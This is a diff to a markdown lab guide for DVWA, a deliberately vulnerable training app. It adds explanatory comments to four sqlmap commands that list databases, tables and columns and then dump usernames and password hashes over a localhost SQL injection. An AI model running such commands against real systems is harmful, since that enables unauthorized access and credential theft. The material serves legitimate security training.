@@ -155,12 +155,16 @@ docker ps
 #### 2.3.2 Exploit the Vulnerability with SQL Map
 
 ```bash
+# Getting the databases
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs
 
+# Getting the tables from the database
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --tables
 
+# Getting the columns from the table
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users --columns
 
+# Dumping the data from the table
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users -C user,password --dump
 ```
 
